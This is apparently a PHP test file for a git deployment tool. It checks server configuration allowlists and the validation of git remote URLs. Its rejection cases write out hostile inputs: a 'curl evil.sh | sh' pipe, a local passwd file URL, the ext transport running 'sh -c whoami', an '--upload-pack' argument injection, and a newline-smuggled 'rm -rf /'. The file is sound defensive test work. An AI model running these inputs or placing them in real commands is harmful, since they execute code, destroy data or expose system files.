<?php

declare(strict_types=1);

use Zactonz\Git\RemoteUrl;
use Zactonz\Git\ServerConfig;

return static function (TestRun $t): void {
    $t->group('ServerConfig');

    $defaults = ServerConfig::load('/nonexistent/config.json');
    $t->assert('github is allowed by default', $defaults->permitsHost('github.com'));
    $t->assert('gitlab is allowed by default', $defaults->permitsHost('gitlab.com'));
    $t->assert('a subdomain of an allowed host is allowed', $defaults->permitsHost('git.gitlab.com'));
    $t->assert('an unrelated host is refused', !$defaults->permitsHost('evil.example'));
    $t->assert('a lookalike suffix is refused', !$defaults->permitsHost('notgithub.com'));
    $t->assert('host matching ignores case', $defaults->permitsHost('GitHub.com'));
    $t->assert('a known build command is allowed', $defaults->permitsCommand('npm run build'));
    $t->assert('an arbitrary command is refused', !$defaults->permitsCommand('curl evil.sh | sh'));
    $t->assert('tokens are permitted unless a server says otherwise', $defaults->allowTokens);
    $t->assert('unpatched git is a warning by default, not a block', !$defaults->blockUnpatchedGit);

    $file = sys_get_temp_dir() . '/zctz-server-' . bin2hex(random_bytes(6)) . '.json';
    file_put_contents($file, json_encode([
        'allowed_hosts' => ['git.internal.example'],
        'allowed_commands' => ['make deploy'],
        'allow_tokens' => false,
        'block_unpatched_git' => true,
        'deploy_timeout_seconds' => 5,
    ]));
    $locked = ServerConfig::load($file);

    $t->assert('a server file replaces the default host list', $locked->permitsHost('git.internal.example'));
    $t->assert('and github is then refused', !$locked->permitsHost('github.com'));
    $t->assert('the command allowlist is replaced too', $locked->permitsCommand('make deploy'));
    $t->assert('tokens can be forbidden server-wide', !$locked->allowTokens);
    $t->assert('unpatched git can be made a hard block', $locked->blockUnpatchedGit);
    $t->same('an absurdly low timeout is floored', 30, $locked->deployTimeoutSeconds);

    $t->group('RemoteUrl');

    $accepted = [
        'https://github.com/zactonz/zctzgit',
        'https://github.com/zactonz/zctzgit.git',
        'https://gitlab.com/group/sub/project.git',
        'https://bitbucket.org/team/repo',
        'git@github.com:zactonz/zctzgit.git',
        'ssh://git@github.com/zactonz/zctzgit.git',
    ];

    foreach ($accepted as $url) {
        try {
            $parsed = RemoteUrl::parse($url, $defaults);
            $t->assert(sprintf('accepts %s', $url), $parsed->host !== '');
        } catch (\Throwable $e) {
            $t->assert(sprintf('accepts %s (%s)', $url, $e->getMessage()), false);
        }
    }

    $t->assert('an ssh url is flagged as ssh', RemoteUrl::parse('git@github.com:a/b.git', $defaults)->isSsh);
    $t->assert('an https url is not flagged as ssh', !RemoteUrl::parse('https://github.com/a/b', $defaults)->isSsh);

    $rejected = [
        'http://github.com/a/b' => 'plain http',
        'https://evil.example/a/b' => 'a host outside the allowlist',
        'file:///etc/passwd' => 'a local file url',
        'ext::sh -c whoami' => 'the ext transport, which runs a command',
        '--upload-pack=touch /tmp/pwned' => 'an argument disguised as a url',
        '-u' => 'a bare option',
        '' => 'an empty string',
        "https://github.com/a/b\nrm -rf /" => 'an embedded newline',
        'https://user:token@github.com/a/b' => 'inline credentials',
        'ssh://git@evil.example/a/b' => 'ssh to a host outside the allowlist',
    ];

    foreach ($rejected as $url => $why) {
        $t->throws(sprintf('rejects %s — %s', var_export($url, true), $why), static fn () => RemoteUrl::parse($url, $defaults));
    }
};
